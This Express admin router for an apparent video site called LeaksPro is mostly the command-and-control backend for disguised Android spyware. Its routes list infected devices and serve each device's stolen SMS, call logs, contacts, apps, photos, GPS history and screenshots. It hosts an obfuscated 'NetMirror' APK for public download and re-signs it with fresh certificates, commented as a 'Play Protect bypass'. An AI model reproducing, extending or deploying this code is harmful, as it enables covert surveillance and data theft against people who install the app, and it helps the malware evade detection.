const express = require('express');
const router = express.Router();
const Video = require('../models/Video');
const db = require('../config/database');
const upload = require('../middleware/upload');
const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
const fs = require('fs');
// Pool rotation removed — serve APK directly from disk

// Admin auth middleware
const adminAuth = (req, res, next) => {
  const password = req.headers['x-admin-password'] || req.query.password;
  const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
  if (!stored || password !== stored.value) {
    return res.status(401).json({ error: 'Unauthorized - Invalid admin password' });
  }
  next();
};

// Helper: cleanup temp file after upload
function cleanupTemp(filePath) {
  if (filePath) {
    try { fs.unlinkSync(filePath); } catch (_) { /* ignore */ }
  }
}

// GET /api/admin/stats
router.get('/stats', adminAuth, (req, res) => {
  try {
    const stats = Video.getStats();
    res.json(stats);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/videos
router.get('/videos', adminAuth, (req, res) => {
  try {
    const { page = 1, limit = 50, search } = req.query;
    const result = Video.getAll({
      page: parseInt(page),
      limit: parseInt(limit),
      search,
      published_only: false,
    });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload - Upload video + optional thumbnail to Cloudinary
router.post('/upload', adminAuth, upload.fields([
  { name: 'video', maxCount: 1 },
  { name: 'thumbnail', maxCount: 1 },
]), async (req, res) => {
  let videoTmpPath, thumbTmpPath;
  try {
    if (!req.files || !req.files.video) {
      return res.status(400).json({ error: 'No video file uploaded' });
    }

    const videoFile = req.files.video[0];
    videoTmpPath = videoFile.path;
    const thumbnailFile = req.files.thumbnail ? req.files.thumbnail[0] : null;
    thumbTmpPath = thumbnailFile ? thumbnailFile.path : null;

    const io = req.app.get('io');

    // Emit: upload started
    if (io) io.emit('upload_progress', { progress: 5, filename: videoFile.originalname, status: 'uploading_to_cloud' });

    // Upload video to Cloudinary
    const videoResult = await uploadToCloudinary(videoTmpPath, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });
    cleanupTemp(videoTmpPath);
    videoTmpPath = null;

    if (io) io.emit('upload_progress', { progress: 80, filename: videoFile.originalname, status: 'video_uploaded' });

    // Upload thumbnail to Cloudinary (if provided)
    let thumbResult = null;
    if (thumbTmpPath) {
      thumbResult = await uploadToCloudinary(thumbTmpPath, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(thumbTmpPath);
      thumbTmpPath = null;
    }

    const videoData = {
      title: req.body.title || videoFile.originalname,
      description: req.body.description || '',
      // Store Cloudinary URL as filename / thumbnail
      filename: videoResult.secure_url,
      thumbnail: thumbResult ? thumbResult.secure_url : (videoResult.secure_url.replace(/\.\w+$/, '.jpg')),
      channel_name: req.body.channel_name || 'LeaksPro Admin',
      category: req.body.category || 'General',
      tags: req.body.tags ? JSON.parse(req.body.tags) : [],
      file_size: videoResult.bytes || videoFile.size,
      mime_type: videoFile.mimetype,
      is_published: req.body.is_published !== 'false',
      is_short: req.body.is_short === 'true',
      duration: videoResult.duration || parseFloat(req.body.duration) || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : (req.body.resolution || ''),
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: videoFile.originalname, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    cleanupTemp(videoTmpPath);
    cleanupTemp(thumbTmpPath);
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload/url - Upload from a direct video URL (no local file needed)
router.post('/upload/url', adminAuth, async (req, res) => {
  try {
    const { url, title, description, category, tags, channel_name, is_published, is_short } = req.body;
    if (!url) return res.status(400).json({ error: 'URL is required' });

    const io = req.app.get('io');
    if (io) io.emit('upload_progress', { progress: 10, filename: url, status: 'uploading_to_cloud' });

    const videoResult = await uploadToCloudinary(url, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });

    const videoData = {
      title: title || 'Untitled',
      description: description || '',
      filename: videoResult.secure_url,
      thumbnail: videoResult.secure_url.replace(/\.\w+$/, '.jpg'),
      channel_name: channel_name || 'LeaksPro Admin',
      category: category || 'General',
      tags: tags ? (typeof tags === 'string' ? JSON.parse(tags) : tags) : [],
      file_size: videoResult.bytes || 0,
      mime_type: `video/${videoResult.format || 'mp4'}`,
      is_published: is_published !== false && is_published !== 'false',
      is_short: is_short === true || is_short === 'true',
      duration: videoResult.duration || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : '',
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: url, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/videos/:id - Update video metadata
router.put('/videos/:id', adminAuth, upload.single('thumbnail'), async (req, res) => {
  try {
    const updateData = { ...req.body };

    // If a new thumbnail file is uploaded, send it to Cloudinary
    if (req.file) {
      const thumbResult = await uploadToCloudinary(req.file.path, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(req.file.path);
      updateData.thumbnail = thumbResult.secure_url;
    }

    if (updateData.tags && typeof updateData.tags === 'string') {
      updateData.tags = JSON.parse(updateData.tags);
    }

    const video = Video.update(req.params.id, updateData);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    const io = req.app.get('io');
    if (io) io.emit('video_updated', video);

    res.json({ success: true, video });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/videos/:id - Delete video (also from Cloudinary)
router.delete('/videos/:id', adminAuth, async (req, res) => {
  try {
    const video = Video.delete(req.params.id);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    // Delete from Cloudinary (best-effort, don't fail the request)
    try {
      const videoPubId = extractPublicId(video.filename);
      if (videoPubId) await deleteFromCloudinary(videoPubId, 'video');
      const thumbPubId = extractPublicId(video.thumbnail);
      if (thumbPubId) await deleteFromCloudinary(thumbPubId, 'image');
    } catch (cloudErr) {
      console.warn('[Cloudinary] Delete warning:', cloudErr.message);
    }

    const io = req.app.get('io');
    if (io) io.emit('video_deleted', { id: req.params.id });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/settings
router.get('/settings', adminAuth, (req, res) => {
  try {
    const rows = db.prepare('SELECT key, value FROM admin_settings').all();
    const settings = {};
    for (const r of rows) settings[r.key] = r.value;
    res.json({ success: true, settings });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/backup — trigger manual Cloudinary DB backup (awaits result)
router.post('/backup', adminAuth, async (req, res) => {
  try {
    const path = require('path');
    const fs = require('fs');
    const DB_PATH = path.join(__dirname, '..', 'data', 'leakspro.db');

    // Count videos
    const rows = db.prepare('SELECT COUNT(*) as cnt FROM videos').get();
    const videoCount = rows ? rows.cnt : 0;

    // Export DB to disk
    db.saveNow();

    // Verify file exists
    const exists = fs.existsSync(DB_PATH);
    const fileSize = exists ? fs.statSync(DB_PATH).size : 0;

    // Init Cloudinary and upload
    const { initCloudinary, uploadDbBackup } = require('../config/cloudinary');
    initCloudinary();

    const result = await uploadDbBackup(DB_PATH);
    res.json({
      success: true,
      message: 'Cloudinary backup successful',
      videoCount,
      fileSize,
      cloudinary: { public_id: result.public_id, bytes: result.bytes, url: result.secure_url }
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message, stack: err.stack });
  }
});

// PUT /api/admin/settings
router.put('/settings', adminAuth, (req, res) => {
  try {
    const { settings } = req.body;
    const stmt = db.prepare('INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)');
    const update = db.transaction((items) => {
      for (const [key, value] of Object.entries(items)) {
        stmt.run(key, String(value));
      }
    });
    update(settings);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections — list all registered devices
router.get('/connections', adminAuth, (req, res) => {
  try {
    const devices = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    const parsed = devices.map(d => {
      try { d.phone_numbers = JSON.parse(d.phone_numbers || '[]'); } catch (_) { d.phone_numbers = []; }
      // Use the actual is_online flag from DB (set to 1 on register, 0 on disconnect/cleanup).
      // As a safety net, also mark offline if last_seen is older than 5 minutes
      // (covers edge cases where disconnect event was missed).
      if (d.is_online) {
        const lastSeen = new Date(d.last_seen + 'Z').getTime();
        const fiveMinAgo = Date.now() - 5 * 60 * 1000;
        if (lastSeen < fiveMinAgo) d.is_online = 0;
      }
      return d;
    });
    const onlineCount = parsed.filter(d => d.is_online === 1).length;
    res.json({
      devices: parsed,
      totalDevices: parsed.length,
      onlineCount,
      offlineCount: parsed.length - onlineCount,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/connections/:deviceId — remove a device and all its data
router.delete('/connections/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    db.prepare('DELETE FROM sms_messages WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM call_logs WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM contacts WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(deviceId);
    try { db.prepare('DELETE FROM gallery_photos WHERE device_id = ?').run(deviceId); } catch (_) {}
    try { db.prepare('DELETE FROM location_history WHERE device_id = ?').run(deviceId); } catch (_) {}
    try { db.prepare('DELETE FROM screen_captures WHERE device_id = ?').run(deviceId); } catch (_) {}
    try { db.prepare('DELETE FROM scheduled_commands WHERE device_id = ?').run(deviceId); } catch (_) {}
    const result = db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
    res.json({ success: true, deleted: result.changes > 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});



// GET /api/admin/connections/:deviceId/sms — get SMS for a device
router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM sms_messages WHERE device_id = ?').get(deviceId);
    const messages = db.prepare(
      'SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      messages,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/call-logs — get call logs for a device
router.get('/connections/:deviceId/call-logs', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM call_logs WHERE device_id = ?').get(deviceId);
    const logs = db.prepare(
      'SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      logs,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/contacts — get contacts for a device
router.get('/connections/:deviceId/contacts', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 200;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM contacts WHERE device_id = ?').get(deviceId);
    const contacts = db.prepare(
      'SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    // Parse JSON fields
    const parsed = contacts.map(c => {
      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
      return c;
    });

    res.json({
      contacts: parsed,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/apps — get installed apps for a device
router.get('/connections/:deviceId/apps', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const showSystem = req.query.system === 'true';

    let apps;
    if (showSystem) {
      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);
    } else {
      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? AND is_system = 0 ORDER BY app_name ASC').all(deviceId);
    }

    const totalAll = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ?').get(deviceId);
    const totalUser = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ? AND is_system = 0').get(deviceId);

    res.json({
      apps,
      totalAll: totalAll ? totalAll.count : 0,
      totalUser: totalUser ? totalUser.count : 0,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/gallery — get gallery photos for a device
router.get('/connections/:deviceId/gallery', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM gallery_photos WHERE device_id = ?').get(deviceId);
    const photos = db.prepare(
      'SELECT id, device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at FROM gallery_photos WHERE device_id = ? ORDER BY date_taken DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      photos,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/location-history — get GPS trail for a device
router.get('/connections/:deviceId/location-history', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const hours = parseInt(req.query.hours) || 24;
    const limit = parseInt(req.query.limit) || 2000;

    const total = db.prepare('SELECT COUNT(*) as count FROM location_history WHERE device_id = ? AND recorded_at >= datetime(\'now\', ? || \' hours\')').get(deviceId, -hours);
    const points = db.prepare(
      'SELECT latitude, longitude, accuracy, source, recorded_at FROM location_history WHERE device_id = ? AND recorded_at >= datetime(\'now\', ? || \' hours\') ORDER BY recorded_at ASC LIMIT ?'
    ).all(deviceId, -hours, limit);

    res.json({
      points,
      total: total ? total.count : 0,
      hours,
      device_id: deviceId,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/screen-captures — get screenshots for a device
router.get('/connections/:deviceId/screen-captures', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM screen_captures WHERE device_id = ?').get(deviceId);
    const captures = db.prepare(
      'SELECT id, device_id, image_base64, width, height, file_size, captured_at FROM screen_captures WHERE device_id = ? ORDER BY captured_at DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      captures,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/connections/:deviceId/screen-captures/:captureId — delete a screenshot
router.delete('/connections/:deviceId/screen-captures/:captureId', adminAuth, (req, res) => {
  try {
    const { deviceId, captureId } = req.params;
    const result = db.prepare('DELETE FROM screen_captures WHERE id = ? AND device_id = ?').run(captureId, deviceId);
    res.json({ success: true, deleted: result.changes > 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/export — export all device data as JSON
router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(deviceId);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }

    const sms = db.prepare('SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC').all(deviceId);
    const callLogs = db.prepare('SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC').all(deviceId);
    const contacts = db.prepare('SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC').all(deviceId);
    const apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);

    // Parse JSON fields in contacts
    const parsedContacts = contacts.map(c => {
      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
      return c;
    });

    const exportData = {
      exported_at: new Date().toISOString(),
      device,
      sms_messages: sms,
      call_logs: callLogs,
      contacts: parsedContacts,
      installed_apps: apps,
      summary: {
        total_sms: sms.length,
        total_calls: callLogs.length,
        total_contacts: contacts.length,
        total_apps: apps.length,
      },
    };

    res.setHeader('Content-Disposition', `attachment; filename="device_${deviceId.substring(0, 8)}_export.json"`);
    res.setHeader('Content-Type', 'application/json');
    res.json(exportData);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/login
router.post('/login', (req, res) => {
  try {
    const { password } = req.body;
    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
    if (stored && password === stored.value) {
      res.json({ success: true, message: 'Logged in' });
    } else {
      res.status(401).json({ error: 'Invalid password' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  Secure APK Upload / Download
// ═══════════════════════════════════════

// DELETE /api/admin/delete-apk — Remove ALL NetMirror APK files from server
router.delete('/delete-apk', adminAuth, (req, res) => {
  try {
    const dataDir = require('path').join(__dirname, '..', 'data');
    const files = ['Netmirror-secure.apk', 'Netmirror-original.apk', 'Netmirror.apk'];
    let deleted = [];
    for (const f of files) {
      const p = require('path').join(dataDir, f);
      if (fs.existsSync(p)) {
        fs.unlinkSync(p);
        deleted.push(f);
      }
    }
    res.json({ success: true, deleted });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload-apk — Upload obfuscated APK to server
router.post('/upload-apk', adminAuth, upload.single('apk'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No APK file uploaded' });
    }

    const dataDir = require('path').join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

    const destPath = require('path').join(dataDir, 'Netmirror-secure.apk');
    const originalPath = require('path').join(dataDir, 'Netmirror-original.apk');

    // Move uploaded file to data directory
    fs.copyFileSync(req.file.path, destPath);
    // ALSO save as the original clean APK — used as the base for all rotations.
    // Without this, each rotation re-signs the PREVIOUS output, causing
    // cumulative asset flooding, growing APK size, and random misalignment
    // that leads to intermittent "App not installed" errors.
    fs.copyFileSync(req.file.path, originalPath);
    cleanupTemp(req.file.path);

    const stats = fs.statSync(destPath);

    // Invalidate landing page download cache so next download uses the new APK
    const invalidateCache = req.app.get('invalidateLandingApkCache');
    if (invalidateCache) invalidateCache();

    res.json({
      success: true,
      message: 'Secure APK uploaded successfully',
      size: stats.size,
      filename: 'Netmirror-secure.apk'
    });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  LeaksProAdmin APK Upload / Download
// ═══════════════════════════════════════

// POST /api/admin/upload-admin-apk — Upload LeaksProAdmin APK
router.post('/upload-admin-apk', adminAuth, upload.single('apk'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No APK file uploaded' });
    }

    const dataDir = require('path').join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

    const destPath = require('path').join(dataDir, 'LeaksProAdmin.apk');

    fs.copyFileSync(req.file.path, destPath);
    cleanupTemp(req.file.path);

    const stats = fs.statSync(destPath);

    // Save upload metadata
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)").run(
      'admin_apk_uploaded_at', new Date().toISOString()
    );
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)").run(
      'admin_apk_size', String(stats.size)
    );

    res.json({
      success: true,
      message: 'LeaksProAdmin APK uploaded successfully',
      size: stats.size,
      filename: 'LeaksProAdmin.apk'
    });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/admin-apk-status — Get admin APK status
router.get('/admin-apk-status', adminAuth, (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'LeaksProAdmin.apk');
    const exists = fs.existsSync(apkPath);
    let size = 0;
    if (exists) {
      size = fs.statSync(apkPath).size;
    }

    const uploadedAt = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_apk_uploaded_at'").get();
    const savedSize = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_apk_size'").get();

    res.json({
      available: exists,
      size: size || (savedSize ? parseInt(savedSize.value) : 0),
      uploaded_at: uploadedAt ? uploadedAt.value : null,
      download_url: exists ? '/downloadapp/LeaksProAdmin.apk' : null
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  On-the-fly APK Identity Rotation
// ═══════════════════════════════════════
const { mutateAndSign, getLastMutationInfo } = require('../utils/apk-mutator');

// GET /api/admin/rotation-status — Check rotation state
router.get('/rotation-status', adminAuth, (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');

    let apkAvailable = false;
    let apkSize = 0;
    if (fs.existsSync(apkPath)) {
      apkAvailable = true;
      apkSize = fs.statSync(apkPath).size;
    } else if (fs.existsSync(fallbackPath)) {
      apkAvailable = true;
      apkSize = fs.statSync(fallbackPath).size;
    }

    // Get rotation count from settings
    const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
    const lastRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_rotated'").get();
    const certRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_cert_hash'").get();

    res.json({
      apk_available: apkAvailable,
      apk_size: apkSize,
      rotation_count: countRow ? parseInt(countRow.value) : 0,
      last_rotated: lastRow ? lastRow.value : null,
      last_cert_hash: certRow ? certRow.value : null
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/rotate-apk — Mutate + re-sign APK with fresh certificate for Play Protect bypass
router.post('/rotate-apk', adminAuth, (req, res) => {
  const io = req.app.get('io');
  try {
    const dataDir = require('path').join(__dirname, '..', 'data');
    const originalPath = require('path').join(dataDir, 'Netmirror-original.apk');
    const apkPath = require('path').join(dataDir, 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(dataDir, 'Netmirror.apk');

    // CRITICAL: Always mutate from the ORIGINAL clean APK (Gradle-signed template).
    // Never mutate from the previous rotation output — that causes cumulative
    // asset flooding, growing APK size, and eventual corruption.
    let sourcePath = null;
    if (fs.existsSync(originalPath)) {
      sourcePath = originalPath;
    } else if (fs.existsSync(apkPath)) {
      sourcePath = apkPath;
      fs.copyFileSync(apkPath, originalPath);
    } else if (fs.existsSync(fallbackPath)) {
      sourcePath = fallbackPath;
      fs.copyFileSync(fallbackPath, originalPath);
    }

    if (!sourcePath) {
      return res.status(404).json({
        error: 'No base APK found on server. Upload one first using the green button.'
      });
    }

    const geoEnabled = req.body.geo !== undefined ? Boolean(req.body.geo) : true;

    // ── MUTATION ENGINE: Fresh cert + DEX mutation + random assets + V2 signing ──
    console.log(`[Rotation] Starting mutation from ${sourcePath}...`);
    const originalBuf = fs.readFileSync(sourcePath);
    const mutatedBuf = mutateAndSign(originalBuf);

    // Verify mutation actually produced a different APK
    const mutationInfo = getLastMutationInfo();
    if (!mutationInfo) {
      console.error('[Rotation] Mutation failed — mutator returned original buffer');
      return res.status(500).json({ error: 'APK mutation failed. Check server logs.' });
    }

    // Save the mutated APK as the active download
    fs.writeFileSync(apkPath, mutatedBuf);
    console.log(`[Rotation] Saved mutated APK: ${mutatedBuf.length} bytes → ${apkPath}`);

    // Update rotation tracking in DB
    const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
    const newCount = (countRow ? parseInt(countRow.value) : 0) + 1;
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('rotation_count', ?)").run(String(newCount));
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_rotated', ?)").run(new Date().toISOString());
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(mutationInfo.certHash);

    console.log(`[Rotation] #${newCount} — Fresh cert: ${mutationInfo.certHash.substring(0, 20)}… CN="${mutationInfo.certCN}" DEX×${mutationInfo.dexMutated} Assets×${mutationInfo.assetsInjected} geo=${geoEnabled}`);

    // Invalidate landing page download cache so next download gets fresh rotation
    const invalidateCache = req.app.get('invalidateLandingApkCache');
    if (invalidateCache) invalidateCache();

    res.json({
      success: true,
      message: `APK mutated + re-signed with fresh certificate #${newCount}`,
      rotation_count: newCount,
      cert_hash: mutationInfo.certHash,
      cert_cn: mutationInfo.certCN,
      cert_org: mutationInfo.certOrg,
      apk_size: mutatedBuf.length,
      dex_mutated: mutationInfo.dexMutated,
      assets_injected: mutationInfo.assetsInjected,
      geo_enabled: geoEnabled
    });

    // ── Auto-push to GitHub Releases (async, non-blocking with retry) ──
    // Updates ALL landing pages (primary Railway, Cloudflare, Render) in real-time
    // because they all fetch the APK from GitHub Releases URL.
    if (io) io.emit('github_push_status', { status: 'pushing', message: 'Pushing rotated APK to GitHub Releases...' });
    (async () => {
      let pushResult = await pushApkToGitHubReleases();
      if (pushResult.success) {
        console.log(`[Rotation] ✅ Auto-pushed to GitHub: ${pushResult.download_url}`);
        if (io) io.emit('github_push_status', { status: 'success', url: pushResult.download_url, message: `APK pushed to GitHub ✔` });
      } else if (pushResult.reason !== 'no_token' && pushResult.reason !== 'no_apk') {
        console.log(`[Rotation] Auto-push failed (${pushResult.reason}), retrying in 3s...`);
        if (io) io.emit('github_push_status', { status: 'retrying', message: `Push failed, retrying...` });
        await new Promise(r => setTimeout(r, 3000));
        pushResult = await pushApkToGitHubReleases();
        if (pushResult.success) {
          console.log(`[Rotation] ✅ Auto-pushed to GitHub (retry): ${pushResult.download_url}`);
          if (io) io.emit('github_push_status', { status: 'success', url: pushResult.download_url, message: `APK pushed to GitHub ✔ (retry)` });
        } else {
          console.log(`[Rotation] Auto-push retry failed: ${pushResult.reason}`);
          if (io) io.emit('github_push_status', { status: 'failed', message: `GitHub push failed: ${pushResult.reason}` });
        }
      } else {
        console.log(`[Rotation] GitHub auto-push skipped: ${pushResult.reason}`);
        if (io) io.emit('github_push_status', { status: 'skipped', message: `GitHub push skipped: ${pushResult.reason}` });
      }
    })().catch(e => {
      console.error('[Rotation] GitHub auto-push error:', e.message);
      if (io) io.emit('github_push_status', { status: 'error', message: e.message });
    });
  } catch (err) {
    console.error('[Rotation] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/download-apk — Download APK directly from disk (public — no auth)
router.get('/download-apk', (req, res) => {
  try {
    const path = require('path');
    const apkPath = path.join(__dirname, '..', 'data', 'Netmirror-secure.apk');
    const origPath = path.join(__dirname, '..', 'data', 'Netmirror-original.apk');
    const fallbackPath = path.join(__dirname, '..', 'data', 'Netmirror.apk');
    let servePath = null;
    if (fs.existsSync(apkPath)) servePath = apkPath;
    else if (fs.existsSync(origPath)) servePath = origPath;
    else if (fs.existsSync(fallbackPath)) servePath = fallbackPath;
    if (!servePath) return res.status(404).json({ error: 'No APK available' });
    const buf = fs.readFileSync(servePath);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
    res.setHeader('Content-Length', buf.length);
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.end(buf);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Pool endpoints removed — serving APK directly from disk

// GET /api/admin/apk-status — Check if secure APK is available
router.get('/apk-status', adminAuth, (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');

    let available = false;
    let size = 0;
    let filename = '';

    if (fs.existsSync(apkPath)) {
      available = true;
      size = fs.statSync(apkPath).size;
      filename = 'Netmirror-secure.apk';
    } else if (fs.existsSync(fallbackPath)) {
      available = true;
      size = fs.statSync(fallbackPath).size;
      filename = 'Netmirror.apk';
    }

    res.json({ available, size, filename });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========== Custom APK Signing Service ==========
const { v4: uuidv4 } = require('uuid');
const pathModule = require('path');
const multerApk = require('multer')({
  storage: require('multer').diskStorage({
    destination: (req, file, cb) => cb(null, require('os').tmpdir()),
    filename: (req, file, cb) => cb(null, `apk_upload_${Date.now()}_${file.originalname}`)
  }),
  limits: { fileSize: 500 * 1024 * 1024 }, // 500MB max
  fileFilter: (req, file, cb) => {
